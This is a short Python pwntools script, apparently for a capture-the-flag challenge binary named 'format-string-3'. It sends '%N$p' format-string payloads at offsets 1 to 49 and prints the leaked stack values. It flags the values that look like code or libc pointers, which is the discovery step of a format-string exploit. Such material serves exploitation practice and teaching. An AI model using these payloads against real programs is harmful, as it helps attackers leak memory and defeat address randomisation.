from pwn import *

binary = context.binary = ELF('./format-string-3', checksec=False)
context.log_level = 'error'

def leak_value(idx):
    p = process(binary.path)
    
    # Wait until after welcome message
    p.recvuntil(b"Here's the address of setvbuf in libc:")
    p.recvline()  # read leaked address line

    payload = f"%{idx}$p".encode()
    p.sendline(payload)
    
    try:
        leaked = p.recvline(timeout=1).strip()
        p.close()
        return leaked
    except Exception:
        p.close()
        return b''

# Try offsets 1 to 50
for i in range(1, 50):
    leak = leak_value(i)
    if leak:
        print(f"[{i:02}] -> {leak}")
        if any(leak.startswith(pfx) for pfx in [b'0x55', b'0x56', b'0x60', b'0x7f']):
            print(f"   [*] Potential pointer at offset {i}: {leak.decode()}")
